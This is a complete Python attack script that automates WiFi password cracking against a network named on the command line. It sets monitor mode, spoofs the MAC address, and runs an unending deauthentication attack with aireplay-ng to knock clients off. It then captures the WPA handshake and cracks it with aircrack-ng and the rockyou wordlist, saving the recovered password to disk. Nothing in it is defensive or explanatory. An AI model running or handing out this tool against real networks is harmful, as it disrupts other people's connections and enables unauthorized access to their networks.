import subprocess
import sys
import os
import re
import atexit
from pathlib import Path
from threading import Thread
from queue import Queue


class WiFi:
    def __init__(self, name, macaddress=None, channel=None) :
        self.name = name
        self.macaddress = macaddress
        self.channel = channel
        self.password = None


@atexit.register
def exit_monitoring_mode():
    try:
        set_mode((interface, "Monitor"), "Managed")
    except NameError:
        pass
    except Exception:
        print("[-] Error alpha AWUS036NHA")

def check_requirements():
    # Root permissions
    if os.geteuid() != 0:
        sys.exit("[-] You need root permissions !")

    # Usage: python3 crack_wifi.py <WiFi>
    elif len(sys.argv) != 2:
        sys.exit("[-] Usage: python3 " + sys.argv[0] + " <WiFi>")


def get_valid_interface():
    print("[+] Getting valid interfaces")

    interfaces = os.listdir("/sys/class/net")
    valid_interfaces = [interface for interface in interfaces if interface.startswith("w")]

    # Set the monitoring mode on an interface
    for interface in valid_interfaces:
        monitoring_interface = set_mode(interface, "Monitor")

        if monitoring_interface:
            return monitoring_interface

    sys.exit("[-] Monitoring mode is not supported by any interface")


def set_mode(interface, interface_mode):
    print("[+] Setting " + interface_mode + " mode")

    # If not, let's try to set it
    subprocess.run(["ifconfig", interface, "down"], stdout=subprocess.DEVNULL)

    # Change the monitoring interface mac address
    if interface_mode == "Monitor":
        print("[+] Changing macaddress")
        subprocess.run(["macchanger", "-r", interface], stdout=subprocess.DEVNULL)

    new_mode = subprocess.run(["iwconfig", interface, "mode", interface_mode], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    subprocess.run(["ifconfig", interface, "up"], stdout=subprocess.DEVNULL)

    if not new_mode.stderr:
        return interface


def kill_interfering_processes():
    print("[+] Killing processes that might interfere")

    # Kill processes that might interfere with the aircrack-ng suite
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)


def get_wifi_information(wifi_name, monitoring_interface):
    print("[+] Getting " + wifi_name + " macaddress and channel(s)")

    wifis_information = {}
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

    # Get WiFi(s) macaddress and channel
    with subprocess.Popen(["airodump-ng", "--essid", wifi_name, monitoring_interface, "-a"], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as monitoring :
        for line in monitoring.stdout:
            line = ansi_escape.sub("", line)

            macaddresses = re.findall(r"(?:[0-9a-fA-F]:?){12}", line)

            if len(macaddresses) == 1 and len(line.split()) > 10:
                wifis_information[macaddresses[0]] = line.split()[5]

            elif len(macaddresses) == 2 and macaddresses[0] in wifis_information:
                return macaddresses[0], wifis_information[macaddresses[0]]


def lets_hack(wifi, monitoring_interface):
    print("\n[+] Attacking: " + wifi.macaddress + " " + wifi.channel + " " + wifi.name)

    # Let's hack
    while wifi.password == None:
            handshake = get_wifi_handshake(wifi, monitoring_interface)
            wifi.password = crack_wifi_password(wifi.name, handshake)

    save_wifi_password(wifi.name, wifi.password)


def get_wifi_handshake(target_wifi, monitoring_interface):
    print("[+] Trying to get the WiFi handshake")

    # Get the WiFi handshake
    attack_pid = deauthentication_attack(target_wifi, monitoring_interface)
    handshake = monitoring_wifi(target_wifi, monitoring_interface, attack_pid)

    return handshake


def deauthentication_attack(target_wifi, monitoring_interface):
    print("Deauthentication attack in progress...")

    # Do a deauthentication attack to get the target WiFi handshake
    attack = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", target_wifi.macaddress, monitoring_interface, "-D"], stdout=subprocess.DEVNULL)

    return attack.pid


def monitoring_wifi(target_wifi, monitoring_interface, attack_pid):
    create_wifi_directory(target_wifi.name)

    # Monitor the target WiFi to get its handshake
    with subprocess.Popen(["airodump-ng", "-w", "./WiFis/" + target_wifi.name + "/" + target_wifi.name, "-c", target_wifi.channel, "--bssid", target_wifi.macaddress, monitoring_interface, "-a"], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as monitoring :
        for line in monitoring.stdout:
            if "Created capture file" in line:
                handshake_file = re.search(r"./WiFis/" + target_wifi.name + r"/[\w \-.cap]+", line)[0]

            if re.search(r"handshake: (?:[0-9a-fA-F]:?){12}", line):
                os.kill(attack_pid, 9)
                return handshake_file


def create_wifi_directory(wifi_directory, wifi_name=""):
    if wifi_directory == "Passwords":
        print("[+] Saving " + wifi_name + " password in ./WiFis/" + wifi_directory + "/ directory")

    elif not Path("./WiFis/" + wifi_directory).exists():
        print("[+] Creating a repository for " + wifi_directory)

    # Create a repository to store information about a WiFi
    Path("./WiFis/" + wifi_directory).mkdir(parents=True, exist_ok=True)


def crack_wifi_password(wifi_name, handshake_file):
    print("\n[+] Cracking " + wifi_name + " password!")

    # Crack the WiFi password with rockyou.txt
    with subprocess.Popen(["aircrack-ng", handshake_file, "-w", "/usr/share/wordlists/rockyou.txt"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True) as crack :
        for line in crack.stdout:
            if "Packets contained no EAPOL data; unable to process this AP." in line :
                print("[-] Error, Try again...")
                break

            if "KEY FOUND!" in line:
                wifi_password = re.search(r"KEY FOUND! \[ .* \]", line)[0]
                print(wifi_password)
                return wifi_password[13:-2]


def save_wifi_password(wifi_name, wifi_password):
    create_wifi_directory("Passwords", wifi_name)

    # Save the WiFi password in a file
    with open("./WiFis/Passwords/" + wifi_name + ".password", "w") as password_file:
        password_file.write(wifi_password + "\n")



if __name__ == "__main__":
    check_requirements()
    interface = get_valid_interface()
    kill_interfering_processes()

    wifi = WiFi(sys.argv[1])
    wifi.macaddress, wifi.channel = get_wifi_information(wifi.name, interface)
    lets_hack(wifi, interface)
